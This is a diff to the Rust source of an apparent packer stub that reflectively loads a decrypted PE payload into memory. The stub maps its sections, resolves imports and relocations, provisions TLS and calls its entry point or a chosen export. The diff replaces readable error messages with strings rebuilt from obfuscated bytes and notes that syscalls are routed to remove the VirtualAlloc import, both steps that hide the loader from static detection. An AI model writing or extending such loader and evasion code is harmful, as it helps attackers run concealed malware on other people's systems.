@@ -54,32 +54,16 @@ struct TlsDirectory {
     SizeOfZeroFill: u32,
     Characteristics: u32,
 }
-/// Errors produced while reflectively loading a PE.
-#[derive(Debug, thiserror::Error)]
-enum ReflectiveLoadingError {
-    #[error("file too small to be a valid PE")]
-    FileTooSmall,
-    #[error("invalid DOS signature (expected MZ)")]
-    InvalidDosSignature,
-    #[error("invalid NT signature (expected PE)")]
-    InvalidNtSignature,
-    #[error("the payload's architecture does not match the stub's (magic 0x{0:04x})")]
-    UnsupportedArchitecture(u16),
-    #[error("failed to allocate image memory (error {0})")]
-    AllocateFailed(u32),
-    #[error("section '{section}' is out of file bounds")]
-    SectionOutOfBounds { section: String },
-    /// The payload's import table could not be resolved (see
-    /// `engine::imports`).
-    #[error(transparent)]
-    Imports(#[from] crate::ImportError),
-    #[error("could not change protection for section '{section}' (error {error})")]
-    VirtualProtectFailed { section: String, error: u32 },
-    #[error("could not provision the payload's TLS (no index or no memory)")]
-    TlsUnavailable,
-    /// `build.payloads.<name>.export` names a symbol the payload does not export.
-    #[error("the payload does not export '{name}'")]
-    ExportNotFound { name: String },
+/// Appends the NTSTATUS to a label (which is rebuilt from obfuscated bytes at
+/// the call site, so this literal carries no diagnostic text).
+fn nt_error(label: String, status: i32) -> String {
+    format!("{label} (0x{:08x})", status as u32)
+}
+
+/// Appends a section name to a label (rebuilt from obfuscated bytes at the call
+/// site, so this literal carries no diagnostic text).
+fn section_error(label: String, section: &str) -> String {
+    format!("{label}: {section}")
 }
 
 /// `TlsAlloc`'s failure value.
@@ -171,7 +155,7 @@ impl BaseRelocationEntry {
 pub unsafe fn run_reflective(
     payload: &[u8],
     export: Option<&str>,
-) -> Result<i32, ReflectiveLoadingError> {
+) -> Result<i32, String> {
     let (_dos, nt) = get_headers(payload)?;
     let is_dll = (*nt).FileHeader.Characteristics.0 & IMAGE_FILE_DLL.0 != 0;
     crate::tech_dbg!(
@@ -206,9 +190,7 @@ pub unsafe fn run_reflective(
             call_dll_main(image_base, nt);
         }
         let address = resolve_export(image_base, nt, name)
-            .ok_or_else(|| ReflectiveLoadingError::ExportNotFound {
-                name: name.to_string(),
-            })?;
+            .ok_or_else(|| format!("{}: '{name}'", $MSG_EXPORT_NOT_FOUND$))?;
         crate::tech_dbg!("reflective_loading", "calling export '{name}' at 0x{address:x}");
         call_export(address);
         return Ok(0);
@@ -220,27 +202,27 @@ pub unsafe fn run_reflective(
 /// Validates the PE and returns pointers to its DOS and NT headers.
 fn get_headers(
     payload: &[u8],
-) -> Result<(*const IMAGE_DOS_HEADER, *const NtHeaders), ReflectiveLoadingError> {
+) -> Result<(*const IMAGE_DOS_HEADER, *const NtHeaders), String> {
     if payload.len() < std::mem::size_of::<IMAGE_DOS_HEADER>() {
-        return Err(ReflectiveLoadingError::FileTooSmall);
+        return Err($MSG_FILE_TOO_SMALL$);
     }
 
     unsafe {
         let dos = payload.as_ptr() as *const IMAGE_DOS_HEADER;
         if (*dos).e_magic != IMAGE_DOS_SIGNATURE {
-            return Err(ReflectiveLoadingError::InvalidDosSignature);
+            return Err($MSG_INVALID_DOS$);
         }
 
         let nt = (dos as usize + (*dos).e_lfanew as usize) as *const NtHeaders;
         if (*nt).Signature != IMAGE_NT_SIGNATURE {
-            return Err(ReflectiveLoadingError::InvalidNtSignature);
+            return Err($MSG_INVALID_NT$);
         }
 
         // The packer already rejects a payload whose arch differs from
         // `build.output.arch`, but keep a defensive check here.
         let magic = (*nt).OptionalHeader.Magic.0;
         if magic != EXPECTED_MAGIC {
-            return Err(ReflectiveLoadingError::UnsupportedArchitecture(magic));
+            return Err(format!("{} (magic 0x{magic:04x})", $MSG_UNSUPPORTED_ARCH$));
         }
 
         Ok((dos, nt))
@@ -250,7 +232,7 @@ fn get_headers(
 /// Allocates the image at its preferred base (falling back to any address).
 /// The allocation goes through the syscall layer's `nt_alloc_vm`, so
 /// `mode: indirect` removes the `VirtualAlloc` import.
-fn allocate_image(nt: *const NtHeaders) -> Result<*mut c_void, ReflectiveLoadingError> {
+fn allocate_image(nt: *const NtHeaders) -> Result<*mut c_void, String> {
     unsafe {
         let size = (*nt).OptionalHeader.SizeOfImage as usize;
         let preferred = (*nt).OptionalHeader.ImageBase as usize;
@@ -279,7 +261,7 @@ fn allocate_image(nt: *const NtHeaders) -> Result<*mut c_void, ReflectiveLoading
             );
         }
         if status < 0 {
-            return Err(ReflectiveLoadingError::AllocateFailed(status as u32));
+            return Err(nt_error($MSG_ALLOCATE_FAILED$, status));
         }
 
         Ok(base)
@@ -290,7 +272,7 @@ fn copy_headers(
     payload: &[u8],
     image_base: *mut c_void,
     nt: *const NtHeaders,
-) -> Result<(), ReflectiveLoadingError> {
+) -> Result<(), String> {
     unsafe {
         let size = (*nt).OptionalHeader.SizeOfHeaders as usize;
         ptr::copy_nonoverlapping(payload.as_ptr(), image_base as *mut u8, size);
@@ -302,7 +284,7 @@ fn copy_sections(
     payload: &[u8],
     image_base: *mut c_void,
     nt: *const NtHeaders,
-) -> Result<(), ReflectiveLoadingError> {
+) -> Result<(), String> {
     unsafe {
         let section_header = (nt as usize + std::mem::size_of::<NtHeaders>())
             as *const IMAGE_SECTION_HEADER;
@@ -318,9 +300,10 @@ fn copy_sections(
             let src = (*section).PointerToRawData as usize;
             let dst = image_base as usize + (*section).VirtualAddress as usize;
             if src + raw_size > payload.len() {
-                return Err(ReflectiveLoadingError::SectionOutOfBounds {
-                    section: section_name(section),
-                });
+                return Err(section_error(
+                    $MSG_SECTION_OUT_OF_BOUNDS$,
+                    &section_name(section),
+                ));
             }
             ptr::copy_nonoverlapping(payload.as_ptr().add(src), dst as *mut u8, raw_size);
         }
@@ -338,7 +321,7 @@ unsafe fn section_name(section: *const IMAGE_SECTION_HEADER) -> String {
 fn fix_imports(
     image_base: *mut c_void,
     nt: *const NtHeaders,
-) -> Result<(), ReflectiveLoadingError> {
+) -> Result<(), String> {
     unsafe {
         let import_dir =
             (*nt).OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT.0 as usize];
@@ -359,7 +342,8 @@ fn fix_imports(
             import_dir.VirtualAddress,
             import_dir.Size,
             crate::resolution_policy,
-        )?;
+        )
+        .map_err(|e| e.to_string())?;
         crate::tech_dbg!("reflective_loading", "IAT patched ({count} import(s))");
     }
     Ok(())
@@ -368,7 +352,7 @@ fn fix_imports(
 fn fix_relocations(
     image_base: *mut c_void,
     nt: *const NtHeaders,
-) -> Result<(), ReflectiveLoadingError> {
+) -> Result<(), String> {
     unsafe {
         let reloc_dir =
             (*nt).OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC.0 as usize];
@@ -427,7 +411,7 @@ fn fix_relocations(
 fn fix_memory_protections(
     image_base: *mut c_void,
     nt: *const NtHeaders,
-) -> Result<(), ReflectiveLoadingError> {
+) -> Result<(), String> {
     unsafe {
         let section_header = (nt as usize + std::mem::size_of::<NtHeaders>())
             as *const IMAGE_SECTION_HEADER;
@@ -462,10 +446,12 @@ fn fix_memory_protections(
                     &mut old,
                 );
                 if status < 0 {
-                    return Err(ReflectiveLoadingError::VirtualProtectFailed {
-                        section: section_name(section),
-                        error: status as u32,
-                    });
+                    return Err(format!(
+                        "{}: {} (0x{:08x})",
+                        $MSG_VIRTUAL_PROTECT_FAILED$,
+                        section_name(section),
+                        status as u32
+                    ));
                 }
             }
         }
@@ -507,7 +493,7 @@ fn fix_memory_protections(
 fn provision_tls(
     image_base: *mut c_void,
     nt: *const NtHeaders,
-) -> Result<(), ReflectiveLoadingError> {
+) -> Result<(), String> {
     unsafe {
         let tls_dir = (*nt).OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_TLS.0 as usize];
         if tls_dir.Size == 0 || tls_dir.VirtualAddress == 0 {
@@ -525,11 +511,11 @@ fn provision_tls(
         if !index_field.is_null() && raw_len + zero_fill > 0 {
             let array = tls_array();
             if array.is_null() {
-                return Err(ReflectiveLoadingError::TlsUnavailable);
+                return Err($MSG_TLS_UNAVAILABLE$);
             }
             let index = TlsAlloc();
             if index == TLS_OUT_OF_INDEXES {
-                return Err(ReflectiveLoadingError::TlsUnavailable);
+                return Err($MSG_TLS_UNAVAILABLE$);
             }
             if used_module_tls_indices().contains(&index) {
                 crate::tech_dbg!(
@@ -554,7 +540,7 @@ fn provision_tls(
                 PAGE_READWRITE.0,
             );
             if status < 0 || block.is_null() {
-                return Err(ReflectiveLoadingError::TlsUnavailable);
+                return Err($MSG_TLS_UNAVAILABLE$);
             }
             if raw_len > 0 {
                 ptr::copy_nonoverlapping(raw_start as *const u8, block as *mut u8, raw_len);
@@ -686,7 +672,7 @@ fn execute_entrypoint(
     image_base: *mut c_void,
     nt: *const NtHeaders,
     is_dll: bool,
-) -> Result<i32, ReflectiveLoadingError> {
+) -> Result<i32, String> {
     if is_dll {
         crate::tech_dbg!("reflective_loading", "running DllMain(DLL_PROCESS_ATTACH)");
         call_dll_main(image_base, nt);
@@ -794,5 +780,5 @@ fn execute_payload(image: &mut [u8]) -> Result<i32, String> {
     // `build.payloads.<name>.export`: a DLL export to call instead of the entry point.
     let export: Option<String> = $DLL_EXPORT_DEF$;
     // SAFETY: `image` is the decrypted, valid x64 PE produced by the packer.
-    unsafe { run_reflective(image, export.as_deref()) }.map_err(|e| e.to_string())
+    unsafe { run_reflective(image, export.as_deref()) }
 }
